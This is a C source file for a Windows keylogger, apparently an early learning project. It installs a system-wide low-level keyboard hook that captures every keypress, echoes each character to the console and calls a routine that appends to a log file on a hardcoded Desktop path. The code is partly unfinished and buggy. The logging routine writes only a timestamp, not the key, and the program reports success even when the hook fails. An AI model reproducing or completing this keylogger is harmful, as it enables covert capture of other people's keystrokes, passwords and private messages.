#include "winkey.h"
// add this line or add user32.lib on Makefile
//#pragma comment(lib, "user32.lib")

/*
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD     vkCode;       A virtual-key code. The code must be a value in the range 1 to 254.
    DWORD     scanCode;     A hardware scan code for the key.
    DWORD     flags;        The extended-key flag, event-injected flags, context code, and transition-state flag.
    DWORD     time;         The time stamp for this message, equivalent to what GetMessageTime would return for this message.
    ULONG_PTR dwExtraInfo;  Additional information associated with the message.
} KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
*/
void    WriteLogs(DWORD vkCode)
{
    UNREFERENCED_PARAMETER(vkCode);

    HANDLE  hFile = CreateFile(
        "C:\\Users\\r4mnesia\\Desktop\\log.txt",
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile error: %lu\n", GetLastError());
        return ;
    }
    
    // set pointer at the end of file for write
    SetFilePointer(hFile, 0, NULL, FILE_END);

    char    *log = FormatLogTime();
    DWORD   written;

    WriteFile(hFile, log, strlen(log), &written, NULL);
    free(log);
    CloseHandle(hFile);
}

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
    DWORD   kCode = 0;

    /*DWORD file = GetFileAttributes("C:\\Users\\r4mnesia\\Desktop\\log.txt");
    if (file != INVALID_FILE_ATTRIBUTES)
    {
        // openfile 
    }
    else
    {
        // create file 
    }*/

    if (wParam == WM_KEYDOWN)
    {
        switch(pkey->vkCode)
        {
            case VK_SPACE:
                kCode = pkey->vkCode;
                printf("[SPACE]");
                break ;
            case VK_RETURN:
                kCode = pkey->vkCode;
                printf("[ENTER]");
                break ;
            case VK_BACK:
                kCode = pkey->vkCode;
                printf("[BACKSPACE]");
                break ;
            default:
                kCode = pkey->vkCode;
                printf("%c", (char)pkey->vkCode);
                WriteLogs(pkey->vkCode);
                break ;
        }
    }


    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main(void)
{
    HHOOK hhook = SetWindowsHookExA(
                            WH_KEYBOARD_LL,
                            hook_proc,
                            NULL,
                            0);

    if (!hhook)
        printf("Hook wasn't installed\n");
    printf("Hook was installed\n");

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}